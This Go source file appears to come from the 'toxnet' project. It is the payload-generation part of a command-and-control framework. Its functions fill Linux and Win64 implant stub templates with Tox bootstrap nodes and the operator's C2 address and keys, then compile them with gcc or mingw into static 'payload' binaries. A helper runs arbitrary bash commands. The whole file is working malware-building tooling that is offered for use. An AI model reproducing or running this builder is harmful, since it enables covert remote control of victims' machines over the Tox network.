package net

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/0x4meliorate/toxnet/payloads"
)

func Shellout(command string) (string, string, error) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd := exec.Command("/bin/bash", "-c", command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	return stdout.String(), stderr.String(), err
}

var BootstrapStub string

func GenerateLinuxStub(outputFile string) {

	servers := GetBootstraps()
	var bootstraps []string
	for _, server := range servers.Nodes {
		if server.StatusTCP || server.StatusUDP {
			bootstraps = append(bootstraps, "\t{\""+server.Ipv4+"\","+strconv.FormatInt(int64(server.Port), 10)+",\""+server.PublicKey+"\"}")
		}
	}

	stub := payloads.Linux_stub
	stub = strings.Replace(stub, "TOXNET_REPLACE_ME_BOOTSTRAPS", strings.Join(bootstraps[:], ",\n"), -1)
	stub = strings.Replace(stub, "TOXNET_REPLACE_ME_TOX_ID", Tox_instance.SelfGetAddress(), -1)
	stub = strings.Replace(stub, "TOXNET_REPLACE_ME_PUB_KEY", Tox_instance.SelfGetPublicKey(), -1)

	err := ioutil.WriteFile("temp_linux_stub.c", []byte(stub), 0666)
	if err != nil {
		fmt.Println("[-] Error: Failed writing Linux stub -", err)
	}

	path, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}

	stdout, stderr, err := Shellout("gcc -s -static -o " + outputFile + " temp_linux_stub.c -Bstatic -l:libtoxcore.a -l:libsodium.a -Bdynamic -lc -lm -lgcc -ldl -lrt -lpthread -pthread")
	if err != nil {
		fmt.Println("[-] Error: Failed compiling Linux stub -", err)
	}

	fmt.Println(stdout, stderr)
	fmt.Println("[+] Generated C2 address:", Tox_instance.SelfGetAddress())
	fmt.Println("[+] Compiled Linux payload:", path+"/"+outputFile)

	err = os.Remove("temp_linux_stub.c")
	if err != nil {
		fmt.Println("[-] Error: Failed removing "+path+"/temp_linux_stub.c -", err)
	}
	fmt.Println("[+] Successfully removed: temp_linux_stub.c")
}

func GenerateWin64Stub(outputFile string) {

	servers := GetBootstraps()
	var bootstraps []string
	for _, server := range servers.Nodes {
		if server.StatusTCP || server.StatusUDP {
			bootstraps = append(bootstraps, "\t{\""+server.Ipv4+"\","+strconv.FormatInt(int64(server.Port), 10)+",\""+server.PublicKey+"\"}")
		}
	}

	stub := payloads.Win64_stub
	stub = strings.Replace(stub, "TOXNET_REPLACE_ME_BOOTSTRAPS", strings.Join(bootstraps[:], ",\n"), -1)
	stub = strings.Replace(stub, "TOXNET_REPLACE_ME_TOX_ID", Tox_instance.SelfGetAddress(), -1)
	stub = strings.Replace(stub, "TOXNET_REPLACE_ME_PUB_KEY", Tox_instance.SelfGetPublicKey(), -1)

	err := ioutil.WriteFile("temp_win64_stub.c", []byte(stub), 0666)
	if err != nil {
		fmt.Println("[-] Error: Failed writing Win64 stub -", err)
	}

	path, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}

	stdout, stderr, err := Shellout("x86_64-w64-mingw32-gcc -s -static -static-libgcc -static-libstdc++ -Iexternal_libraries/libsodium-win64/include/ -Iexternal_libraries/c-toxcore-win64/include/ external_libraries/c-toxcore-win64/bin/libtox.dll external_libraries/libsodium-win64/bin/libsodium-26.dll -o " + outputFile + " temp_win64_stub.c -lm -lgcc -lpthread -pthread")
	if err != nil {
		fmt.Println("[-] Error: Failed compiling Win64 stub -", err)
	}

	fmt.Println(stdout, stderr)
	fmt.Println("[+] Generated C2 address:", Tox_instance.SelfGetAddress())
	fmt.Println("[+] Compiled Win64 payload:", path+"/"+outputFile)

	err = os.Remove("temp_win64_stub.c")
	if err != nil {
		fmt.Println("[-] Error: Failed removing "+path+"/temp_win64_stub.c -", err)
	}
	fmt.Println("[+] Successfully removed: temp_win64_stub.c")
}
